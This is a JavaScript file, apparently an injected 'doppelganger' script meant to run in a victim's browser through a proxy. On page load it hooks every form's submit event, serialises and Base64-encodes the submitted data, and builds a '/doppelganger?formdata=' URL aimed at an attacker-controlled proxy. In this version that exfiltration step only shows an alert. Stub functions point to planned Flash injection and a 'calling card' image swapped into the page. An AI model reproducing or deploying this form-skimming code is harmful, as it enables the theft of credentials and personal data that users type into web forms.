var httpServer="http://proxyIpAddr:httpPort";



function initialize_doppelganger()
{
	//display_calling_card();
	form_steal();
	//alert("Doppelganger running!");
}

function display_calling_card()
{
	var body = $$('body')[0];
	var calling_card = httpServer + "/images/calling_card.jpg";
	
	var img = new Element("img",
		{
			'src': calling_card
		}
	);
	body.update(img);
}

function steal_form_data(form)
{
	encoded_form_data = Base64.encode(Form.serialize(form));
	var url = "/doppelganger?formdata=" + encoded_form_data.substring(0, encoded_form_data.length - 2);
	alert(url);
}

function form_steal()
{
	var forms = $$('form');
	for (i=0; i<forms.length; i++)
	{	
		forms[i].observe('submit', function(event) { steal_form_data(this); });
	
		//var formElements = Form.getElements(forms[i]);
		
		//for (j=0; j<formElements.length; j++)
		//{
		//	if (formElements[j].type == "submit")
		//	{
		//		formElements[j].observe('click', function () { alert("item clicked!"); });
			//}
		//}
	}
}



function flash_inject()
{
		var flash_applet = httpServer + "/flash/flash.swf";		
}

function break_fixit()
{
}

//Event.observe(window, "load", function() { initialize_doppelganger(); });
document.observe("dom:loaded", function() { initialize_doppelganger(); });

